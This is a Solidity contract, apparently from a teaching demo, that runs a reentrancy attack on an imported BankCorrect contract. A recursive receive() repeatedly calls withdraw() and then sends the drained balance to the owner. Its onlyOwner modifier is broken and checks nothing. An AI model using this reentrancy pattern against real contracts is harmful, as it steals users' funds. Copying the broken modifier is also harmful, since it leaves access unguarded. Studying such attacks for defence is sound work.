//SPDX-License-Identifier: MIT

import "./BankCorrect.sol";

pragma solidity ^0.8.4;


contract AttackCorrect{

    address private owner;
    BankCorrect private bankContract;

    event AttackLoading(string message, uint bankBalance);
    event AttackComplete(string message, uint bankBalance);

    modifier onlyOwner(){
        msg.sender == owner;
        _;
    }

    constructor(address _bankAddress){
        bankContract = BankCorrect(_bankAddress);
        owner = msg.sender;
    }


    function attack()external payable{
        bankContract.deposit{value: msg.value}();
        bankContract.withdraw();
    }


    receive()external payable{
        if(bankContract.getContractBalance() > 0){
            emit AttackLoading("Attack Loading...",bankContract.getContractBalance());
            bankContract.withdraw();
        }else{
            emit AttackComplete("Attack Complete...",bankContract.getContractBalance());
            payable(owner).transfer(address(this).balance);
        }
    }

}
